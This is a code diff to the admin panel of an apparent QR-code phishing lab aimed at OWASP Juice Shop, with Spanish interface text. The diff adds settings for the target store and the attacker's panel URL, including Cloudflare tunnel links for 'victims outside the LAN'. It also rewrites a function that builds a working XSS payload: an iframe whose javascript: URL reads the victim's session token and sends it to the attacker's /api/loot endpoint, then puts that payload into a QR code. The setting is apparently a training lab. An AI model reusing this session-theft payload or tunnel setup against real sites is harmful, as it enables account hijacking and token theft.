@@ -29,6 +29,13 @@
   <section class="counters" id="counters"></section>
 
   <section class="arsenal">
+    <div class="basebar">
+      <label for="inpStoreUrl">URL de la tienda — destino de los QR 1 y 2</label>
+      <input id="inpStoreUrl" placeholder="http://IP-LAN:4000" spellcheck="false">
+      <label for="inpPanelUrl">URL del panel — adónde llega el botín (payload del QR 2)</label>
+      <input id="inpPanelUrl" placeholder="http://IP-LAN:3000" spellcheck="false">
+      <p class="hint">Por defecto usan tu IP LAN. Si las víctimas no están en tu LAN, corre <code>make tunnel</code> y pega aquí las URLs <code>https://….trycloudflare.com</code> (<code>make tunnel-url</code> las imprime): los QRs y el script se regeneran con ellas. Deja un campo vacío para volver a su IP LAN.</p>
+    </div>
     <div class="qrbox">
       <h2>1. Cebo — la "tienda"</h2>
       <p class="hint">La víctima se registra e inicia sesión aquí. Todo parece legítimo.</p>
@@ -92,6 +99,10 @@ async function start() {
     const [stats, config] = await Promise.all([api('/api/admin/stats'), fetch('/api/config').then(r => r.json())]);
     renderStats(stats);
     arsenalTarget = { lanIp: config.lanIp, port: config.port };
+    if (arsenalTarget.lanIp) {
+      $('inpStoreUrl').value = localStorage.qlab_store_url || defaultStoreBase();
+      $('inpPanelUrl').value = localStorage.qlab_panel_url || defaultPanelBase();
+    }
     renderQrArsenal();
   } catch (e) { return; }
   $('gate').hidden = true; $('panel').hidden = false;
@@ -189,22 +200,47 @@ function renderQr(element, url) {
 }
 
 // ---------- QR arsenal: session theft against Juice Shop ----------
-// WARNING: sessionStorage is per-origin — every URL must use the LAN IP
-// (lanIp), never localhost, or the victim's token is missing and loot=none
-// is all that arrives.
-function buildSessionTheftPayload(lanIp, panelPort) {
-  return `<iframe src="javascript:fetch('http://${lanIp}:${panelPort}/api/loot?loot='+encodeURIComponent(sessionStorage.getItem('token')||localStorage.getItem('token')||'none'),{mode:'no-cors'})">`;
+// WARNING: sessionStorage is per-origin — the bait (QR 1) and the theft page
+// (QR 2) must share the store origin or the victim's token is missing and
+// loot=none is all that arrives. Both come from the same store-base input, so
+// they can never drift apart.
+function defaultStoreBase() {
+  return `http://${arsenalTarget.lanIp}:4000`;
 }
+function defaultPanelBase() {
+  return `http://${arsenalTarget.lanIp}:${arsenalTarget.port}`;
+}
+// Store/panel bases: the inputs win when filled, the LAN defaults apply when
+// left empty. Paste the trycloudflare URLs here when running `make tunnel`
+// with victims outside the LAN.
+function storeBase() {
+  return ($('inpStoreUrl').value.trim() || defaultStoreBase()).replace(/\/+$/, '');
+}
+function panelBase() {
+  return ($('inpPanelUrl').value.trim() || defaultPanelBase()).replace(/\/+$/, '');
+}
+function buildSessionTheftPayload(base) {
+  return `<iframe src="javascript:fetch('${base}/api/loot?loot='+encodeURIComponent(sessionStorage.getItem('token')||localStorage.getItem('token')||'none'),{mode:'no-cors'})">`;
+}
+function bindBaseInput(id, storageKey) {
+  $(id).addEventListener('input', () => {
+    const value = $(id).value.trim();
+    if (value) localStorage[storageKey] = value;
+    else localStorage.removeItem(storageKey);
+    if (arsenalTarget && arsenalTarget.lanIp) renderQrArsenal();
+  });
+}
+bindBaseInput('inpStoreUrl', 'qlab_store_url');
+bindBaseInput('inpPanelUrl', 'qlab_panel_url');
 function renderQrArsenal() {
   if (!arsenalTarget || !arsenalTarget.lanIp) {
     $('url1').textContent = 'No se detectó IP LAN. Arranca con LAN_IP=tu.ip make up (o npm start con LAN_IP en .env).';
     return;
   }
-  const { lanIp, port } = arsenalTarget;
-  const baitUrl = `http://${lanIp}:4000/`;
+  const baitUrl = storeBase() + '/';
   $('url1').textContent = baitUrl;
   renderQr($('qr1'), baitUrl);
-  const theftUrl = `http://${lanIp}:4000/#/search?q=${encodeURIComponent(buildSessionTheftPayload(lanIp, port))}`;
+  const theftUrl = storeBase() + '/#/search?q=' + encodeURIComponent(buildSessionTheftPayload(panelBase()));
   $('url2').textContent = theftUrl;
   renderQr($('qr2'), theftUrl);
 }
